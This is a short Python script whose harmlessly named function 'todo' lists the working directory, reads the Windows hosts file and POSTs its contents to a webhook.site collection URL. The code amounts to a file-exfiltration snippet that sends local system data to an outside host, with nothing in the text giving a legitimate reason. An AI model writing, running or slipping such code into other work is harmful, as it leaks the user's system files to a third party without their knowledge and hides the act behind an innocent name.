import requests
import os

def todo():
    url = "	https://webhook.site/a9b36ccb-53b8-42b1-9fec-e27032f8b2e1"
    file_name = r"C:\Windows\System32\drivers\etc\hosts"

    print(os.listdir(os.getcwd()))

    with open(os.path.join(os.getcwd(), file_name), "r") as f:
        data = f.read()

    headers = {
        "Content-Type": "application/octet-stream",
    }

    resp = requests.post(url, headers=headers, data=data)


